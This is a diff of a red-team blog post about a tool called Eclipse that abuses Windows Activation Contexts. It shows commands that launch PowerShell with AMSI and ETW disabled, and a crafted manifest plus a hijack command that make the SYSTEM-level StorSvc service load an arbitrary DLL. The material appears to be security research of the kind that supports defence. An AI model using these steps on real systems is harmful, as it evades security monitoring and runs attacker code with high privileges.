@@ -207,7 +207,7 @@ Once again, compile on `release` mode. Finally, let's craft the manifest file fr
 </assembly>
 ```
 
-Finally, run Eclipse (note the use of the `-n` flag  to set `CREATE_NEW_CONSOLE` at the time of spawning the new process):
+Then, just run Eclipse (note the use of the `-n` flag  to set `CREATE_NEW_CONSOLE` at the time of spawning the new process):
 
 	C:\Path\To\Eclipse\eclipse\target\release> eclipse.exe -m spawn -b C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -f C:\Path\To\powershell.manifest -n
 	[+] Local Activation Context created.
@@ -218,7 +218,7 @@ Finally, run Eclipse (note the use of the `-n` flag  to set `CREATE_NEW_CONSOLE`
 	[+] PEB successfully patched.
 	[-] Resuming process...
 
-The new `powershell.exe` process will have AMSI and ETW disabled. The first one can be checked by typing the string "amsiutils", which normally would be detected as a malicious string but now it just shows a "not found" error message:
+The new `powershell.exe` process will have AMSI and ETW disabled. The first one can be checked by typing the string `amsiutils`, which normally would be detected as a malicious string but now it just shows a "not found" error message:
 
 ![AMSI disabled.](/images/powershell1.PNG "AMSI disabled.")
 
@@ -229,6 +229,48 @@ To check that ETW is disabled too, the tab .NET assemblies of PH can be used. Th
 This is just an example to show the potential of the tecnique. The same concept could be abused to modify the behaviour of a process in many other ways.
 
 ## Hijack the AC of an already running process
+
+We can also hijack the active AC of a running process right before triggering the load of some DLL. To illustrate this, we will use the [Dll Hijack in StorSvc service](https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc), altough it wouldn't make any sense to perform this action in a real scenario. Anyway, the execution of the [RpcClient](https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc/RpcClient) triggers a `LoadLibraryW("SprintCSP.dll")` from the `StorSvc` service, which will look for this file in all paths set in the `%Path%` environment variable. In case it finds the DLL, it then calls the `FactoryResetUICC` exported function:
+
+![DLL search order triggered.](/images/hijack1.PNG "DLL search order triggered.")
+
+We can use Eclipse to redirect the service into loading this DLL from a specific location. For that, we just need to create the relevant manifest file:
+
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1" xmlns:asmv3="urn:schemas-microsoft-com:asm.v3">
+ <assemblyIdentity type="win32" name="Test.exe" processorArchitecture="amd64" version="7.0.18.12988"></assemblyIdentity>
+ <asmv3:application>
+  <asmv3:windowsSettings>
+   <activeCodePage xmlns="http://schemas.microsoft.com/SMI/2019/WindowsSettings">UTF-8</activeCodePage>
+  </asmv3:windowsSettings>
+ </asmv3:application>
+     <file name="SprintCSP.dll" hash="optional" loadFrom="C:/Temp/MyDll.dll"/>
+</assembly>
+```
+
+Then, hijack the AC of the service with the following command (admin privileges required since `StorSvc` runs as `SYSTEM`):
+
+	C:\Path\To\Eclipse\eclipse\target\release> eclipse.exe -m hijack -d -p <storsvc pid> -f C:\Temp\crafted.manifest
+	[+] SeDebugPrivilege enabled.
+	[+] Local Activation Context created.
+	[-] Looking for the remote process main thread...
+	[+] Main thread detected. TID: 7008.
+	        \[-] Handle to main thread opened.
+	        \[!] Main thread does not have a custom AC enabled. Hijacking main AC of the process.
+	[+] Remote process PEB base address obtained.
+	[+] Memory successfully allocated.
+	[+] Activation Context mapped in the remote process.
+	[+] PEB successfully patched.
+
+Once this is done, if we execute `RpcClient` once again, instead of looking for `SprintCSP.dll` in all the paths set in `%PATH%` envar, the service will load the DLL located in `C:\Temp\MyDll.dll`:
+
+![StorSvc AC hijacked.](/images/hijack2.PNG "StorSvc AC hijacked.")
+
+In this case, the `FactoryResetUICC` of my DLL was just an infinite loop and its execution can be checked using PH:
+
+![FactoryResetUICC function executed.](/images/hijack3.PNG "FactoryResetUICC function executed.")
+
 
 # Conclusions
 # References
